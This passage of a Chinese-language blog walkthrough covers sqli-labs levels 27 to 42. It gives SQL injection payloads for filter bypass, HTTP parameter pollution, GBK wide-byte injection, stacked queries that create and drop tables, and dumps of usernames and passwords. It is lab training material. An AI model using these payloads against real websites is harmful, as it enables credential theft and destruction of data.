title="Less-27-过滤union、select"></a>Less-27-过滤union、select</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;%a0ORDER%a0BY%a03||&#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;=&#x27;</span><span class="hljs-number">1</span><br><br>?id<span class="hljs-operator">=</span><span class="hljs-number">9999</span><span class="hljs-string">&#x27;%a0UNION%a0SELECT%a01,2,3%a0or%a0&#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;=&#x27;</span><span class="hljs-number">1</span><br><br>?id<span class="hljs-operator">=</span><span class="hljs-number">1111</span><span class="hljs-string">&#x27;%a0UniOn%a0SelECT%a01,2,3;%00</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">?id=9999&#x27;</span><span class="hljs-operator">%</span>a0UNiON<span class="hljs-operator">%</span>a0SElECT<span class="hljs-operator">%</span>a01,<span class="hljs-number">2</span>,<span class="hljs-number">3</span><span class="hljs-operator">%</span>a0or<span class="hljs-operator">%</span>a0<span class="hljs-string">&#x27;1&#x27;</span><span class="hljs-operator">=</span><span class="hljs-string">&#x27;1</span><br><span class="hljs-string"></span><br><span class="hljs-string">?id=9999&#x27;</span><span class="hljs-operator">%</span>a0UNiON<span class="hljs-operator">%</span>a0SELeCT<span class="hljs-operator">%</span>a01,database(),<span class="hljs-number">3</span><span class="hljs-operator">%</span>a0or<span class="hljs-operator">%</span>a0<span class="hljs-string">&#x27;1&#x27;</span><span class="hljs-operator">=</span><span class="hljs-string">&#x27;1</span><br><span class="hljs-string"></span><br><span class="hljs-string">?id=9999&#x27;</span><span class="hljs-operator">%</span>a0UNiON<span class="hljs-operator">%</span>a0SELeCT<span class="hljs-operator">%</span>a01,group_concat(table_name),<span class="hljs-number">3</span><span class="hljs-operator">%</span>a0FROM<span class="hljs-operator">%</span>a0information_schema.tables<span class="hljs-operator">%</span>a0WHERE<span class="hljs-operator">%</span>a0table_schema <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;security&#x27;</span><span class="hljs-operator">%</span>a0or<span class="hljs-operator">%</span>a0<span class="hljs-string">&#x27;1&#x27;</span><span class="hljs-operator">=</span><span class="hljs-string">&#x27;2</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure><h4 id="Less-28"><a href="#Less-28" class="headerlink" title="Less-28"></a>Less-28</h4><h4 id="Less-29-HPP-‘"><a href="#Less-29-HPP-‘" class="headerlink" title="Less-29-HPP-‘"></a>Less-29-HPP-‘</h4><p>**WAF (Web 应用防护系统)**是通过执行一系列针对 HTTP&#x2F;HTTPS 的安全策略来专门为 Web 应用提供保护的一款产品。此处应该是对注入的参数进行了强效过滤，以此达到了 WAF 的作用。</p><p>绕过的方法是 <strong>HPP (HTTP Parameter Pollution)</strong>，也就是 HTTP 参数污染。我们注入两个同名的参数 id，第一个参数用于绕过 WAF，第二个参数用于注入。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?<span class="hljs-built_in">id</span>=1&amp;<span class="hljs-built_in">id</span>=2<br></code></pre></td></tr></table></figure><p>这种攻击成功绕过了 WAF，对第二个参数用单引号闭合并注释掉后面的内容。网页回显正常的参数，说明网页存在单引号闭合的字符型注入。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?<span class="hljs-built_in">id</span>=1&amp;<span class="hljs-built_in">id</span>=2<span class="hljs-string">&#x27;--+</span><br></code></pre></td></tr></table></figure><p>获取数据库信息</p><p>使用参数污染后，注入流程和 Less 1 一样。判断表有几列。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?<span class="hljs-built_in">id</span>=1&amp;<span class="hljs-built_in">id</span>=1<span class="hljs-string">&#x27; ORDER BY 3--+</span><br></code></pre></td></tr></table></figure><p>判断哪些列可用。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?<span class="hljs-built_in">id</span>=1&amp;<span class="hljs-built_in">id</span>=-1<span class="hljs-string">&#x27; UNION SELECT 1,2,3--+</span><br></code></pre></td></tr></table></figure><p>爆数据库名。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?<span class="hljs-built_in">id</span>=1&amp;<span class="hljs-built_in">id</span>=-1<span class="hljs-string">&#x27; UNION SELECT 1,database(),3 --+</span><br></code></pre></td></tr></table></figure><p>爆表名。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?<span class="hljs-built_in">id</span>=1&amp;<span class="hljs-built_in">id</span>=-1<span class="hljs-string">&#x27; UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=&#x27;</span>security<span class="hljs-string">&#x27;--+</span><br></code></pre></td></tr></table></figure><p>爆字段名。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?<span class="hljs-built_in">id</span>=1&amp;<span class="hljs-built_in">id</span>=-1<span class="hljs-string">&#x27; union select 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_schema=&#x27;</span>security<span class="hljs-string">&#x27; and table_name=&#x27;</span><span class="hljs-built_in">users</span><span class="hljs-string">&#x27;--+</span><br></code></pre></td></tr></table></figure><p>爆出 users 表中的信息。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?<span class="hljs-built_in">id</span>=1&amp;<span class="hljs-built_in">id</span>=-1<span class="hljs-string">&#x27; UNION SELECT 1,group_concat(concat_ws(&#x27;</span>:<span class="hljs-string">&#x27;,username,password)),3 FROM security.users--+</span><br></code></pre></td></tr></table></figure><h4 id="Less-30-HPP-“"><a href="#Less-30-HPP-“" class="headerlink" title="Less-30-HPP-“"></a>Less-30-HPP-“</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-operator">&amp;</span>id<span class="hljs-operator">=</span><span class="hljs-number">1</span>&quot; ORDER BY 3--+<br><br>?id=1&amp;id=-1&quot; <span class="hljs-keyword">UNION</span> <span class="hljs-keyword">SELECT</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span><span class="hljs-comment">--+</span><br><br>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-operator">&amp;</span>id<span class="hljs-operator">=</span><span class="hljs-number">-1</span>&quot; UNION SELECT 1,database(),3 --+<br><br>?id=1&amp;id=-1&quot; <span class="hljs-keyword">UNION</span> <span class="hljs-keyword">SELECT</span> <span class="hljs-number">1</span>,group_concat(table_name),<span class="hljs-number">3</span> <span class="hljs-keyword">FROM</span> information_schema.tables <span class="hljs-keyword">WHERE</span> table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;security&#x27;</span><span class="hljs-comment">--+</span><br><br>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-operator">&amp;</span>id<span class="hljs-operator">=</span><span class="hljs-number">-1</span>&quot; union select 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;--+<br><br>?id=1&amp;id=-1&quot; <span class="hljs-keyword">UNION</span> <span class="hljs-keyword">SELECT</span> <span class="hljs-number">1</span>,group_concat(concat_ws(<span class="hljs-string">&#x27;:&#x27;</span>,username,password)),<span class="hljs-number">3</span> <span class="hljs-keyword">FROM</span> security.users<span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><h4 id="Less-31-HPP-“"><a href="#Less-31-HPP-“" class="headerlink" title="Less-31-HPP-“)"></a>Less-31-HPP-“)</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-operator">&amp;</span>id<span class="hljs-operator">=</span><span class="hljs-number">1</span>&quot;) ORDER BY 3--+<br><br>?id=1&amp;id=-1&quot;) <span class="hljs-keyword">UNION</span> <span class="hljs-keyword">SELECT</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span><span class="hljs-comment">--+</span><br><br>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-operator">&amp;</span>id<span class="hljs-operator">=</span><span class="hljs-number">-1</span>&quot;) UNION SELECT 1,database(),3 --+<br><br>?id=1&amp;id=-1&quot;) <span class="hljs-keyword">UNION</span> <span class="hljs-keyword">SELECT</span> <span class="hljs-number">1</span>,group_concat(table_name),<span class="hljs-number">3</span> <span class="hljs-keyword">FROM</span> information_schema.tables <span class="hljs-keyword">WHERE</span> table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;security&#x27;</span><span class="hljs-comment">--+</span><br><br>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-operator">&amp;</span>id<span class="hljs-operator">=</span><span class="hljs-number">-1</span>&quot;) union select 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;--+<br><br>?id=1&amp;id=-1&quot;) <span class="hljs-keyword">UNION</span> <span class="hljs-keyword">SELECT</span> <span class="hljs-number">1</span>,group_concat(concat_ws(<span class="hljs-string">&#x27;:&#x27;</span>,username,password)),<span class="hljs-number">3</span> <span class="hljs-keyword">FROM</span> security.users<span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><h4 id="Less-32-33-36-宽字节注入"><a href="#Less-32-33-36-宽字节注入" class="headerlink" title="Less-32,33,36-宽字节注入"></a>Less-32,33,36-宽字节注入</h4><p>注入正常的参数，网页回显正常信息。注入单引号对参数进行闭合，网页虽然返回了正确的信息，但是对单引号进行了转义。</p><p>?id&#x3D;1’</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022015124.png"></p><hr><p>宽字节注入（<strong>GBK&#x2F;Big5 Character Encoding SQL Injection</strong>）是一种利用数据库字符集与Web应用层字符编码不一致，结合转义函数（如<code>addslashes</code>）缺陷的SQL注入攻击方式。</p><p><strong>漏洞原理</strong></p><ol><li><strong>字符集转换问题</strong><ul><li>当数据库使用GBK等多字节编码时，某些字符（如<code>0xbf5c</code>）会被视为一个合法字符（如<code>縗</code>），而非两个独立字节。</li><li>攻击者通过输入<code>%bf%27</code>（<code>0xbf</code> + <code>&#39;</code>的URL编码<code>%27</code>），触发字符集转换错误。</li></ul></li><li><strong>转义函数绕过</strong><ul><li>PHP的<code>addslashes</code>或<code>mysql_real_escape_string</code>会将单引号<code>&#39;</code>转义为<code>\&#39;</code>（即<code>%5c%27</code>）。</li><li>当输入<code>%bf%27</code>时，转义后的字符串变为<code>%bf%5c%27</code>。由于GBK将<code>%bf%5c</code>解析为合法字符<code>縗</code>，剩下的<code>%27</code>（<code>&#39;</code>）未被转义，导致注入。</li></ul></li></ol><hr><p>对于一般的转义字符，我们是无法构造注入的 payload 的，但这并不代表网页就没有任何漏洞可以注入。对<strong>宽字节注入漏洞</strong>进行测试，注入如下参数。当数据库的编码采用 <strong>GBK 国标码</strong>时，虽然单引号还是会加上反斜杠从而被转义，但是 “%df” 会和反斜杠的 URL 编码 “%5C” 闭合，从而构成 GBK 国标码中的汉字“連”，使得用于转义的反斜杠被我们“吃掉”了。这种操作是由于 GBK 国标码是双字节表示一个汉字，因此导致了反斜杠和其他的字符共同表示为一个汉字。这可以让数据库的 SQL 查询了正确的参数(汉字)，从而可以使用 UNION 语句进行注入。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-operator">%</span>df<span class="hljs-string">&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022015843.png"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-operator">%</span>df<span class="hljs-string">&#x27; ORDER BY 3--+</span><br><span class="hljs-string">?id=1%df&#x27;</span> <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> <span class="hljs-number">4</span><span class="hljs-comment">--+</span><br><br>?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-operator">%</span>df<span class="hljs-string">&#x27; UNION SELECT 1,2,3 --+</span><br><span class="hljs-string"></span><br><span class="hljs-string">?id=-1%df&#x27;</span> <span class="hljs-keyword">UNION</span> <span class="hljs-keyword">SELECT</span> <span class="hljs-number">1</span>,database(),<span class="hljs-number">3</span> <span class="hljs-comment">--+</span><br><br>#此处数据库名要用十六进制 (HEX) 编码替代，避免单引号的使用。<br>?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-operator">%</span>df<span class="hljs-string">&#x27; UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=0x7365637572697479--+</span><br><span class="hljs-string"></span><br><span class="hljs-string">?id=-1%df&#x27;</span> <span class="hljs-keyword">UNION</span> <span class="hljs-keyword">SELECT</span> <span class="hljs-number">1</span>,group_concat(column_name),<span class="hljs-number">3</span> <span class="hljs-keyword">FROM</span> information_schema.columns <span class="hljs-keyword">WHERE</span> table_schema<span class="hljs-operator">=</span><span class="hljs-number">0x7365637572697479</span> <span class="hljs-keyword">and</span> table_name<span class="hljs-operator">=</span><span class="hljs-number">0x7573657273</span><span class="hljs-comment">--+</span><br><br>?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-operator">%</span>df<span class="hljs-string">&#x27; UNION SELECT 1,group_concat(concat_ws(0x3a,username,password)),3 FROM security.users--+</span><br></code></pre></td></tr></table></figure><h4 id="Less-34-37-宽字节注入-POST"><a href="#Less-34-37-宽字节注入-POST" class="headerlink" title="Less-34,37-宽字节注入-POST"></a>Less-34,37-宽字节注入-POST</h4><p>这一关是POST，抓包看一看，传入admin’&#x2F;admin,同样对单引号转义，可以用宽字节注入</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022015751.png"></p><p>uname&#x3D;%df’&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022015431.png"></p><p>uname&#x3D;%df’–+&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit注释后页面正常，存在单引号注入</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022015972.png"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs sql">uname<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-operator">%</span>df<span class="hljs-string">&#x27; UNION SELECT 1,2 --+&amp;passwd=&amp;submit=Submit</span><br><span class="hljs-string"></span><br><span class="hljs-string">uname=1%df&#x27;</span> <span class="hljs-keyword">UNION</span> <span class="hljs-keyword">SELECT</span> database(),<span class="hljs-number">2</span> <span class="hljs-comment">--+&amp;passwd=&amp;submit=Submit</span><br><br>uname<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-operator">%</span>df<span class="hljs-string">&#x27; UNION SELECT group_concat(table_name),2 FROM information_schema.tables WHERE table_schema=0x7365637572697479 --+&amp;passwd=&amp;submit=Submit</span><br><span class="hljs-string"></span><br><span class="hljs-string">uname=1%df&#x27;</span> <span class="hljs-keyword">UNION</span> <span class="hljs-keyword">SELECT</span> group_concat(column_name),<span class="hljs-number">2</span> <span class="hljs-keyword">FROM</span> information_schema.columns <span class="hljs-keyword">WHERE</span> table_schema<span class="hljs-operator">=</span><span class="hljs-number">0x7365637572697479</span> <span class="hljs-keyword">AND</span> table_name<span class="hljs-operator">=</span><span class="hljs-number">0x7573657273</span> <span class="hljs-comment">--+&amp;passwd=&amp;submit=Submit</span><br><br>uname<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-operator">%</span>df<span class="hljs-string">&#x27; UNION SELECT group_concat(concat_ws(0x3a,username,password)),2 FROM security.users--+&amp;passwd=&amp;submit=Submit</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022015543.png"></p><h4 id="Less-35-宽字节注入-数字型"><a href="#Less-35-宽字节注入-数字型" class="headerlink" title="Less-35-宽字节注入-数字型"></a>Less-35-宽字节注入-数字型</h4><p>直接用 ORDER BY 排序，网页回显正常数据，确定是数值型注入。由于数值型注入不涉及任何编码问题，因此任何转义操作都形同虚设。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> <span class="hljs-number">3</span><span class="hljs-comment">--+</span><br><br>#直接获取数据<br>?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span> <span class="hljs-keyword">UNION</span> <span class="hljs-keyword">SELECT</span> <span class="hljs-number">1</span>,group_concat(concat_ws(<span class="hljs-number">0x3a</span>,username,password)),<span class="hljs-number">3</span> <span class="hljs-keyword">FROM</span> security.users<span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><h4 id="Less-38-堆叠注入"><a href="#Less-38-堆叠注入" class="headerlink" title="Less-38-堆叠注入"></a>Less-38-堆叠注入</h4><p>这一关可以用Less-1的payload就可以获取数据，</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><br>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;</span><br><span class="hljs-string">?id=1&#x27;</span> <span class="hljs-comment">--+</span><br>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; order by 3 --+</span><br><span class="hljs-string">?id=1&#x27;</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">4</span> <span class="hljs-comment">--+</span><br>?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,2,3 --+</span><br><span class="hljs-string"></span><br><span class="hljs-string">?id=-1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,database(),<span class="hljs-number">3</span> <span class="hljs-comment">--+</span><br><br>?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=&#x27;</span>security<span class="hljs-string">&#x27;--+</span><br><span class="hljs-string"></span><br><span class="hljs-string">?id=-1&#x27;</span> <span class="hljs-keyword">UNION</span> <span class="hljs-keyword">SELECT</span> <span class="hljs-number">1</span>,group_concat(table_name),<span class="hljs-number">3</span> <span class="hljs-keyword">FROM</span> information_schema.tables <span class="hljs-keyword">WHERE</span> table_schema<span class="hljs-operator">=</span><span class="hljs-number">0x7365637572697479</span><span class="hljs-comment">--+</span><br># <span class="hljs-number">0x7365637572697479</span> 代替 <span class="hljs-string">&#x27;security&#x27;</span>,通过十六进制编码 避免单引号使用，绕过转义和过滤机制。<br><br>?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_schema=&#x27;</span>security<span class="hljs-string">&#x27; and table_name=&#x27;</span>users<span class="hljs-string">&#x27;--+</span><br><span class="hljs-string"></span><br><span class="hljs-string">?id=-1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(column_name),<span class="hljs-number">3</span> <span class="hljs-keyword">FROM</span> information_schema.columns <span class="hljs-keyword">WHERE</span> table_schema<span class="hljs-operator">=</span><span class="hljs-number">0x7365637572697479</span> <span class="hljs-keyword">and</span> table_name<span class="hljs-operator">=</span><span class="hljs-number">0x7573657273</span><span class="hljs-comment">--+</span><br><br>?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; UNION SELECT 1,group_concat(concat_ws(&#x27;</span>:<span class="hljs-string">&#x27;,username,password)),3 FROM security.users--+</span><br><span class="hljs-string"></span><br><span class="hljs-string">?id=-1&#x27;</span> <span class="hljs-keyword">UNION</span> <span class="hljs-keyword">SELECT</span> <span class="hljs-number">1</span>,group_concat(concat_ws(<span class="hljs-number">0x3a</span>,username,password)),<span class="hljs-number">3</span> <span class="hljs-keyword">FROM</span> security.users<span class="hljs-comment">--+</span><br><br></code></pre></td></tr></table></figure><p>但这一关是用来练习堆叠注入的</p><hr><p>堆叠注入（<strong>Stacked Queries Injection</strong>）是一种允许攻击者在一次数据库请求中执行 <strong>多条SQL语句</strong> 的注入技术。其核心是利用SQL语句的分隔符（如分号 <code>;</code>）拼接恶意代码，常用于执行任意数据库操作（增删改查）。</p><p><strong>堆叠注入原理</strong></p><p><strong>基本条件</strong></p><ul><li><strong>数据库支持多语句执行</strong>：<br>MySQL默认情况下 <strong>不支持</strong> 堆叠注入（需特定驱动或配置，如PHP的<code>mysqli_multi_query</code>）。<br>SQL Server、PostgreSQL等数据库通常支持。</li><li>**应用程序未过滤分号 **<code>;</code>：<br>若代码直接拼接用户输入且未过滤分号，攻击者可插入分号分隔多条SQL语句。</li></ul><hr><p>所谓<strong>堆叠注入</strong>就是在原语句后加上分号，从而闭合前面的内容作为第一条 SQL 语句。然后在后面输入第二条的数据库操作语句，在条件允许可以被后端带入数据库执行。堆叠注入使用的范围非常有限，例如后端可能会限制 SQL 只执行一条语句。一旦这种漏洞存在，对数据库的破坏性是毁灭性的，因为这表示攻击者可以肆意对数据库进行操作。<br>例如此处使用堆叠注入新建一张表，使用 CREATE TABLE 子句，该表将复制 users 表作为一张新的表存在。这种复制可以结合 SQL 注入爆出表名来复制，也可以用社会工程学来猜测。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;;CREATE TABLE WhiteMoon LIKE users;--+</span><br></code></pre></td></tr></table></figure><p>网页回显正常的信息，打开数据库发现security库中已经多了一张whitemoon表了。<br><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022016387.png"></p><p>使用堆叠查询把 users 表中的数据插入新的表中，使用 INSERT INTO 子句实现。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;;INSERT INTO WhiteMoon SELECT * FROM users;--+</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022016395.png"></p><p>使用堆叠查询新建的表的所有记录删掉，使用 DELETE 子句实现。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;;DELETE FROM WhiteMoon;--+</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022016341.png"></p><p>使用堆叠查询把新建的表删掉，使用 DROP 子句实现。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;;DROP TABLE WhiteMoon;--+</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022016826.png"></p><h4 id="Less-39-41-堆叠注入-数字型"><a href="#Less-39-41-堆叠注入-数字型" class="headerlink" title="Less-39,41-堆叠注入-数字型"></a>Less-39,41-堆叠注入-数字型</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span>;<span class="hljs-keyword">CREATE TABLE</span> WhiteMoon <span class="hljs-keyword">LIKE</span> users;<span class="hljs-comment">--+</span><br>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span>;<span class="hljs-keyword">INSERT INTO</span> WhiteMoon <span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users;<span class="hljs-comment">--+</span><br>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span>;<span class="hljs-keyword">DELETE</span> <span class="hljs-keyword">FROM</span> WhiteMoon;<span class="hljs-comment">--+</span><br>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span>;<span class="hljs-keyword">DROP</span> <span class="hljs-keyword">TABLE</span> WhiteMoon;<span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><h4 id="Less-40-堆叠注入-‘"><a href="#Less-40-堆叠注入-‘" class="headerlink" title="Less-40-堆叠注入-‘)"></a>Less-40-堆叠注入-‘)</h4><p>?id&#x3D;1正常</p><p>?id&#x3D;1’不显示</p><p>?id&#x3D;1”正常</p><p>id&#x3D;1)不显示</p><p>id&#x3D;1’)不显示</p><p>id&#x3D;1”）正常</p><p>id&#x3D;1’))不显示</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;);CREATE TABLE WhiteMoon LIKE users;--+</span><br><span class="hljs-string">?id=1&#x27;</span>);<span class="hljs-keyword">INSERT INTO</span> WhiteMoon <span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users;<span class="hljs-comment">--+</span><br>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;);DELETE FROM WhiteMoon;--+</span><br><span class="hljs-string">?id=1&#x27;</span>);<span class="hljs-keyword">DROP</span> <span class="hljs-keyword">TABLE</span> WhiteMoon;<span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><h4 id="Less-42-43-44-45-堆叠注入-二次注入"><a href="#Less-42-43-44-45-堆叠注入-二次注入" class="headerlink" title="Less-42,43,44,45-堆叠注入&#x2F;二次注入"></a>Less-42,43,44,45-堆叠注入&#x2F;二次注入</h4><p>用户名测试什么都没有，密码测试直接登录成功</p><p>a’ OR 1 &#x3D; 1#</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022016073.png"></p><p>可以在已知某个用户的用户名的条件下使用万能密码夺取用户，也可以使用二次注入（Less-24）进行攻击。由于密码参数没有进行防御，可以在该字段测试堆叠注入。使用 Less-38 的测试流程，每次登陆时完成一步堆叠注入。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql">a<span class="hljs-string">&#x27; OR 1 = 1;CREATE TABLE WhiteMoon 